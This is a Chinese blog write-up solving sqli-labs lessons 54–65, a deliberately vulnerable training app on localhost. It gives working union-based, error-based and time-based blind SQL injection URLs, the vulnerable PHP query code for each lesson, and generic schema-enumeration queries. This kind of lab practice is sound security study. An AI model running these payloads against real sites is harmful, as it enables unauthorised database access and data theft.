<h2 id="Page-4-Challenges"><a href="#Page-4-Challenges" class="headerlink" title="Page-4  (Challenges)"></a>Page-4  (Challenges)</h2><h3 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h3><h4 id="手动注入-55"><a href="#手动注入-55" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取表名cul94axau9</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取列名id,sessid,secret_B27K,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;cul94axau9&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取答案</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_B27K) from challenges.cul94axau9--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/1aoe3HdJVti8zqP.png" alt="54.png"></p>
<h3 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h3><h4 id="手动注入-56"><a href="#手动注入-56" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取表名k6cm9525rm</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取列名id,sessid,secret_6TMN,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;k6cm9525rm&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取答案</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_6TMN) from challenges.k6cm9525rm--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/ScPXqw9oER13LjV.png" alt="55.png"></p>
<h3 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h3><h4 id="手动注入-57"><a href="#手动注入-57" class="headerlink" title="手动注入"></a>手动注入</h4><p>本关使用<code>(&#39;&#39;)</code>处理输入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-56/?id=-1&#x27;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-37"><a href="#源码分析-37" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h3><h4 id="手动注入-58"><a href="#手动注入-58" class="headerlink" title="手动注入"></a>手动注入</h4><p>本关使用<code>&quot;&quot;</code>处理输入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-57/?id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-38"><a href="#源码分析-38" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h3><h4 id="手动注入-59"><a href="#手动注入-59" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-58/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h3><h4 id="手动注入-60"><a href="#手动注入-60" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-59/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-39"><a href="#源码分析-39" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h3><h4 id="手动注入-61"><a href="#手动注入-61" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-60/?id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-40"><a href="#源码分析-40" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;(&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h3><h4 id="手动注入-62"><a href="#手动注入-62" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=-1&#x27;))<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-41"><a href="#源码分析-41" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h3><h4 id="手动注入-63"><a href="#手动注入-63" class="headerlink" title="手动注入"></a>手动注入</h4><p>延时注入（可以使用脚本）</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=1&#x27;)<span class="attribute">and</span> If(ascii(substr((<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,sleep(<span class="number">10</span>))--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-42"><a href="#源码分析-42" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h3><h4 id="手动注入-64"><a href="#手动注入-64" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p>
<h4 id="源码分析-43"><a href="#源码分析-43" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h3><h4 id="手动注入-65"><a href="#手动注入-65" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p>
<h4 id="源码分析-44"><a href="#源码分析-44" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h3><h4 id="手动注入-66"><a href="#手动注入-66" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p>
<h4 id="源码分析-45"><a href="#源码分析-45" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="常用方法总结"><a href="#常用方法总结" class="headerlink" title="常用方法总结"></a>常用方法总结</h2><h3 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h3><p>Mysql 有一个系统数据库<code>information_schema</code>，存储着所有的数据库的相关信息，一般的，我们利用该表可以进行一次完整的注入。以下为一般的流程。 </p>
<h4 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line">select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure>

<h4 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select xxxx from xxxxxx </span><br></pre></td></tr></table></figure>

<blockquote>
<p>上述知识参考用例：less1-less4</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://evolution957.github.io/">Evo1ution</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://evolution957.github.io/2022/05/17/sqli-labs/">https://evolution957.github.io/2022/05/17/sqli-labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Evolution957.github.io" target="_blank">Evo1ution's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="https://img.gejiba.com/images/b679a24981fd5cace80446bbac9ea233.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/05/27/upload-labs/"><img class="prev-cover" src="https://img.gejiba.com/images/a6b9cf032a5ebcb28b3c44b3c606a2de.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">upload-labs 刷题记录</div></div></a></div><div class="next-post pull-right"><a href="/2022/05/05/BugKu-Web4/"><img class="next-cover" src="/img/BugKu_Web4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BugKu Web 刷题记录 4</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/04/25/BugKu-Web2/" title="BugKu Web 刷题记录2"><img class="cover" src="https://img.gejiba.com/images/0551ff166e0e0f38501c50fdaa3f0786.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-25</div><div class="title">BugKu Web 刷题记录2</div></div></a></div><div><a href="/2022/04/24/BugKu-Web1/" title="BugKu Web 刷题记录1"><img class="cover" src="https://img.gejiba.com/images/2da3987b7d33039c8ec0c5995314d1d5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-24</div><div class="title">BugKu Web 刷题记录1</div></div></a></div><div><a href="/2022/05/05/BugKu-Web4/" title="BugKu Web 刷题记录 4"><img class="cover" src="/img/BugKu_Web4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-05</div><div class="title">BugKu Web 刷题记录 4</div></div></a></div><div><a href="/2022/04/27/BugKu-Web3/" title="BugKu Web 刷题记录3"><img class="cover" src="/img/BugKu_Web3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-27</div><div class="title">BugKu Web 刷题记录3</div></div></a></div><div><a href="/2022/04/21/pikachu/" title="pikachu靶场刷题记录"><img class="cover" src="https://img.gejiba.com/images/38507a7763893f9c24a5dea404182ad9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">pikachu靶场刷题记录</div></div></a></div><div><a href="/2022/06/23/buuctf-web1/" title="buuctf Web 刷题记录 1"><img class="cover" src="/img/buuctf_web1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-23</div><div class="title">buuctf Web 刷题记录 1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">sqli-labs 刷题记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Page-1-Basic-Challenges"><span class="toc-number">1.1.</span> <span class="toc-text">Page-1 (Basic Challenges)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-GET-Error-based-Single-quotes-String-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2-GET-Error-based-Intiger-based-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4-GET-Error-based-Double-Quotes-String-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">Less-4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-3"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5-GET-Double-Injection-Single-Quotes-String-%E5%8F%8C%E6%B3%A8%E5%85%A5GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.</span> <span class="toc-text">Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8left-%E5%92%8Clength-%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E7%89%88%E6%9C%AC%E5%8F%B7%E5%8F%8A%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.5.2.1.</span> <span class="toc-text">利用left()和length()函数获取版本号及库名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8substr-%E5%92%8Cascii-%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.5.2.2.</span> <span class="toc-text">利用substr()和ascii()函数获取表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8regexp-%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E5%AD%97"><span class="toc-number">1.1.5.2.3.</span> <span class="toc-text">利用regexp()函数获取列名字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ord-%E5%92%8Cmid-%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96users-%E8%A1%A8%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.5.2.4.</span> <span class="toc-text">利用ord()和mid()函数获取users 表的内容</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8floor-rand-0-2-%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.3.1.</span> <span class="toc-text">利用floor(rand(0)*2)进行报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-double-%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E8%B6%85%E5%87%BA%E8%8C%83%E5%9B%B4%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.3.2.</span> <span class="toc-text">利用 double 数值类型超出范围进行报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-bigint-%E6%BA%A2%E5%87%BA%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.3.3.</span> <span class="toc-text">利用 bigint 溢出进行报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8xpath-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.3.4.</span> <span class="toc-text">利用xpath 函数报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E7%9A%84%E9%87%8D%E5%A4%8D%E6%80%A7"><span class="toc-number">1.1.5.3.5.</span> <span class="toc-text">利用数据的重复性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.5.3.6.</span> <span class="toc-text">延时注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6-GET-Double-Injection-Double-Quotes-String-%E5%8F%8C%E6%B3%A8%E5%85%A5GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.6.</span> <span class="toc-text">Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-4"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-5"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7-GET-Dump-into-outfile-String-%EF%BC%88%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6GET%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.1.7.</span> <span class="toc-text">Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-6"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-5"><span class="toc-number">1.1.7.2.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-%E5%B8%83%E5%B0%94%E5%9E%8B%E5%8D%95%E5%BC%95%E5%8F%B7GET%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.8.</span> <span class="toc-text">Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-6"><span class="toc-number">1.1.8.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-7"><span class="toc-number">1.1.8.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9-GET-Blind-Time-based-Single-Quotes-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.9.</span> <span class="toc-text">Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-7"><span 